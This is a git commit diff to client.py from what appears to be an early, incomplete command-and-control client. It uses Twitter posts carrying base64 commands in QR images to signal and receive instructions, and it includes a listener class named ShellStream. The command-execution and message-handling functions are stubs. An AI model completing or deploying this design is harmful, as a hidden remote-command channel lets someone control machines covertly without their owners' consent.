f7c172ceeb8e8648ff8ded16e4a4fc239db02e2f
unknown <hichiaty@gmail.com>
2020-08-10 23:36:06 +0100

    added streaming api

--- client.py
+++ client.py
@@ -7,7 +7,7 @@ import zlib
 import qrcode
 from pyzbar.pyzbar import decode
 from PIL import Image
-# we using QRs cause twitter limit
+# we using QRs cause twitter character limit banter
 
 if not os.path.exists('id'):
     client_id = uuid.uuid4().hex
@@ -27,10 +27,11 @@ def read_qr(img):
     message = decode(Image.open(img))[0].data.decode()
     return base64.b64decode(message).decode('utf-8')
 
-def post_message(message):
+def post_response(message):
     return 0
 
 def read_message(tweet):
+    # get image from tweet and read qr
     return 0
 
 auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
@@ -42,27 +43,38 @@ def confirm_connection(api):
     # send tweet confirming connection
     # client_id::command_in_b64::confirm
     # client_id::command_in_b64::response
-    api.update_status(f'{client_id}::Client_Confirmed::confirm')
+    api.update_status(f'{client_id}::::Client_Confirmed::::confirm')
     return True
 
-connected = confirm_connection(api)
 
 def tweet_type(tweet):
-    return tweet.split('::')[-1]
+    message = read_message(tweet)
+    return tweet.split('::::')[-1]
 
 def tweet_client(tweet):
+    # still waiting for a twitter API key
+    return 0
 
+# create listener
+class ClientListener(tweepy.StreamListener):
 
-def check_commands(api):
-    tweet = api.user_timeline(id = api.me().id, count = 1)[0]
-    if tweet_type(tweet) == 'command' and tweet_client(tweet) == client_id:
-        #decode comand and execute
+    def on_data(self, raw_data):
+        # process raw stream data, read qr, pipe message
+        self.process_raw(raw_data)
+        return True
 
+    def process_raw(self, raw_data):
+        # do shit here
+        pass
 
+    def on_error(self, status_code):
+        if status_code == 420:
+            return False
 
-while True:
-    if connected:
-        check_commands(api)
-    
-    
-    time.sleep(60)
+# create stream
+class ShellStream():
+    def __init__(self, auth, listener):
+        self.stream = tweepy.Stream(auth=auth, listener=listener)
+
+    def start(self, user_id):
+        self.stream.filter(track = [user_id])
